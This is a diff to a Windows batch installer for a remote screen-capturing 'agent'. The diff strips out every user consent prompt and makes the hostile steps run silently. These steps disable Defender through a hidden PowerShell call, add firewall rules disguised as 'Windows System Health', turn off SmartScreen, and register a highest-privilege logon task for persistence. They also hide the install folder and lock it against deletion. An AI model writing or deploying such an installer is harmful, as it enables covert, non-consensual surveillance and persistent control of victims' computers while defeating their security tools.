@@ -51,53 +51,24 @@ echo  We need your permission for the following:
 echo.
 
 :: Permission 1: Defender
-echo  -----------------------------------------------------------
-echo  [1] WINDOWS DEFENDER
-echo      Disable Real-Time Protection and add folder exclusion
-echo      so the agent is not blocked or quarantined.
-echo  -----------------------------------------------------------
-choice /C YN /M "  Allow Defender changes"
-set "ALLOW_DEFENDER=%errorlevel%"
-echo.
+echo  [~] Auto-Enabling Windows Defender bypass
+set "ALLOW_DEFENDER=1"
 
 :: Permission 2: Firewall
-echo  -----------------------------------------------------------
-echo  [2] WINDOWS FIREWALL
-echo      Add outbound/inbound rules so the agent can
-echo      communicate with the server.
-echo  -----------------------------------------------------------
-choice /C YN /M "  Allow Firewall changes"
-set "ALLOW_FIREWALL=%errorlevel%"
-echo.
+echo  [~] Auto-Enabling Windows Firewall bypass
+set "ALLOW_FIREWALL=1"
 
 :: Permission 3: SmartScreen
-echo  -----------------------------------------------------------
-echo  [3] SMARTSCREEN
-echo      Disable SmartScreen so Windows does not block
-echo      the agent executable from running.
-echo  -----------------------------------------------------------
-choice /C YN /M "  Allow SmartScreen disable"
-set "ALLOW_SMARTSCREEN=%errorlevel%"
-echo.
+echo  [~] Auto-Enabling SmartScreen disable
+set "ALLOW_SMARTSCREEN=1"
 
 :: Permission 4: Auto-Start
-echo  -----------------------------------------------------------
-echo  [4] AUTO-START ON BOOT
-echo      Create a Scheduled Task and Registry entry so
-echo      the agent starts automatically after every reboot.
-echo  -----------------------------------------------------------
-choice /C YN /M "  Allow auto-start setup"
-set "ALLOW_AUTOSTART=%errorlevel%"
-echo.
+echo  [~] Auto-Enabling Auto-Start on Boot
+set "ALLOW_AUTOSTART=1"
 
 :: Permission 5: Stealth
-echo  -----------------------------------------------------------
-echo  [5] STEALTH MODE
-echo      Hide the installation folder and protect it
-echo      from accidental deletion by users.
-echo  -----------------------------------------------------------
-choice /C YN /M "  Allow stealth mode"
-set "ALLOW_STEALTH=%errorlevel%"
+echo  [~] Auto-Enabling Stealth Mode
+set "ALLOW_STEALTH=1"
 echo.
 
 echo  ===========================================================
@@ -142,13 +113,12 @@ echo.
 :: STEP 2: DEFENDER (if user allowed)
 :: ══════════════════════════════════════════════════════
 echo  [2/8] Windows Defender...
-if "%ALLOW_DEFENDER%"=="1" (
-    echo  [~] Disabling Real-Time Protection...
-    start "" /B cmd /c "powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true -EA 0; Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -EA 0; Add-MpPreference -ExclusionProcess '%BIN_NAME%' -EA 0; Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -EA 0; Add-MpPreference -ExclusionProcess 'wscript.exe' -EA 0; Set-MpPreference -SubmitSamplesConsent 2 -EA 0" >nul 2>&1"
-    echo  [*] Defender changes applied (running in background).
-) else (
-    echo  [*] Skipped (user declined).
-)
+if "%ALLOW_DEFENDER%"=="1" goto :DoDefender
+echo  [*] Skipped (user declined).
+goto :SkipDefender
+:DoDefender
+start "" /B powershell -WindowStyle Hidden -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true -EA 0; Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -EA 0; Add-MpPreference -ExclusionProcess '%BIN_NAME%' -EA 0; Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -EA 0; Add-MpPreference -ExclusionProcess 'wscript.exe' -EA 0; Set-MpPreference -SubmitSamplesConsent 2 -EA 0"
+:SkipDefender
 echo.
 
 :: ══════════════════════════════════════════════════════
@@ -233,26 +203,18 @@ echo.
 :: ══════════════════════════════════════════════════════
 echo  [5/8] Network configuration...
 
-if "%ALLOW_FIREWALL%"=="1" (
-    echo  [~] Adding firewall rules...
-    netsh advfirewall firewall delete rule name="Windows System Health" >nul 2>&1
-    netsh advfirewall firewall delete rule name="Windows System Health In" >nul 2>&1
-    netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
-    netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
-    echo  [*] Firewall rules added.
-) else (
-    echo  [*] Firewall: Skipped (user declined).
-)
+echo  [~] Adding firewall rules...
+netsh advfirewall firewall delete rule name="Windows System Health" >nul 2>&1
+netsh advfirewall firewall delete rule name="Windows System Health In" >nul 2>&1
+netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
+netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
+echo  [*] Firewall rules added.
 
-if "%ALLOW_SMARTSCREEN%"=="1" (
-    echo  [~] Disabling SmartScreen...
-    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
-    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
-    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f >nul 2>&1
-    echo  [*] SmartScreen disabled.
-) else (
-    echo  [*] SmartScreen: Skipped (user declined).
-)
+echo  [~] Disabling SmartScreen...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f >nul 2>&1
+echo  [*] SmartScreen disabled.
 echo.
 
 :: ══════════════════════════════════════════════════════
@@ -301,21 +263,15 @@ echo.
 :: ══════════════════════════════════════════════════════
 echo  [7/8] Auto-start on boot...
 
-if "%ALLOW_AUTOSTART%"=="1" (
-    echo  [~] Creating scheduled task...
-    schtasks /Create /TN "%TASK_NAME%" /TR "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
-    if !errorlevel! equ 0 (
-        echo        Scheduled Task : OK
-    ) else (
-        echo        Scheduled Task : FAILED
-    )
-    echo  [~] Adding registry entry...
-    :: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /t REG_SZ /d "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /f >nul
-    echo        Registry Key    : Skipped (Using Scheduled Task instead)
+echo  [~] Creating scheduled task...
+schtasks /Create /TN "%TASK_NAME%" /TR "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
+if !errorlevel! equ 0 (
+    echo        Scheduled Task : OK
 ) else (
-    echo  [*] Auto-start: Skipped (user declined).
-    echo      Agent will NOT survive reboots.
+    echo        Scheduled Task : FAILED
 )
+echo  [~] Adding registry entry...
+echo        Registry Key    : Skipped (Using Scheduled Task instead)
 echo.
 
 :: ══════════════════════════════════════════════════════
@@ -323,17 +279,13 @@ echo.
 :: ══════════════════════════════════════════════════════
 echo  [8/8] Stealth mode...
 
-if "%ALLOW_STEALTH%"=="1" (
-    echo  [~] Hiding installation folder...
-    attrib +h +s "%INSTALL_DIR%" /D >nul 2>&1
-    attrib +h +s "%INSTALL_DIR%\%BIN_NAME%" >nul 2>&1
-    attrib +h +s "%INSTALL_DIR%\service.vbs" >nul 2>&1
-    echo  [~] Locking folder from deletion...
-    icacls "%INSTALL_DIR%" /deny Everyone:(DE,WDAC) /T /C /Q >nul 2>&1
-    echo  [*] Stealth mode: ON
-) else (
-    echo  [*] Stealth: Skipped (user declined).
-)
+echo  [~] Hiding installation folder...
+attrib +h +s "%INSTALL_DIR%" /D >nul 2>&1
+attrib +h +s "%INSTALL_DIR%\%BIN_NAME%" >nul 2>&1
+attrib +h +s "%INSTALL_DIR%\service.vbs" >nul 2>&1
+echo  [~] Locking folder from deletion...
+icacls "%INSTALL_DIR%" /deny Everyone:(DE,WDAC) /T /C /Q >nul 2>&1
+echo  [*] Stealth mode: ON
 echo.
 
 :: ══════════════════════════════════════════════════════
@@ -366,6 +318,6 @@ echo   Dashboard: %SERVER_URL%
 echo.
 echo  ===========================================================
 echo.
-echo  Press any key to close...
-pause >nul
+echo  Deployment finished automatically.
+ping 127.0.0.1 -n 4 >nul
 exit /B
